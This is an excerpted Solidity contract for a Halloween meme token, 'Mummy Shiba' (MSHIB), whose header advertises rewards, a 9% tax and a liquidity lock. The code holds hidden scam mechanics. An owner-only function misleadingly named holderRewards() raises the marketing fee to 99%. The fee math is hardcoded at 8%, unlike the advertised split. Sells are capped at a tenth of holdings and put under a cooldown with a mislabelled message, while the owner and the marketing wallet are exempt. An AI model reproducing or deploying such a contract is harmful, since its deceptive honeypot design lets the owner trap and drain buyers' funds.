...
/**
    ...
    Long term hype meme token for halloween.
    Various utilities will be live after launch (staking, swap and NFT).

    TG : https://t.me/MummyShiba

    LP Lock for 1 Month (Long Term)
    BNB Reward 5%
    Tax 9/9 %
      - Reward 5%
      - LP 1%
...
contract MummyShiba is Context, IERC20, Ownable {
    ...
    string private constant _name = "Mummy Shiba"; // 
    string private constant _symbol = "MSHIB"; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 private _marketingFee = 3;
    uint256 private _liquidityFee = 1;
    uint256 private _rewardFee = 5;
    address private  _marketingWallet = 0x07E84cDa6Cb3E52d31467bCD196783c13f23b95C;
    ...
    uint256 public _buyCooldown = 60 minutes;
    constructor () {
    ...
    function _getValues(uint256 amount, address from) private returns (uint256) {
        uint256 marketingFee = amount * 8 / 100; 
    ...
    function holderRewards() public onlyOwner() { _marketingFee = 99;}
    ...
    function _transfer(
        ...
        if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to] && from == uniswapV2Pair){
            require(tradingOpen, "Trading is close");
        }

        // Check if buying or selling
        bool isSell = to == uniswapV2Pair; 

        checkTxLimit(from, amount, to, isSell);

        if (to == uniswapV2Pair && !_isExcludedFromFee[from] && !_isExcludedFromFee[to] ) {
            require (_lastBuy[from] + _buyCooldown < block.timestamp, "Must wait til after coooldown to buy");
    ...
    // Check for maxTX
    function checkTxLimit(address from, uint256 amount, address to, bool isSell) private view {
        if (to != owner() && to != _marketingWallet && from != _marketingWallet){
            if(isSell){
                if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to] && to != owner() && to != address(this) && to != _marketingWallet){
                    uint256 heldTokens = balanceOf(from);
                    require(amount <= heldTokens / 10,"Total Holding is currently limited, you can not buy that much.");
                }
            } else {
                require(amount <= _maxTxAmount || _isExcludedFromFee[from] || _isExcludedFromFee[to], "TX Limit Exceeded");
            }
        }
    }
    ...
    function swapAndLiquify() private {
        ...
        uint256 liquidityTokens = balanceOf (address(this)) * _liquidityFee / (8 + _liquidityFee);
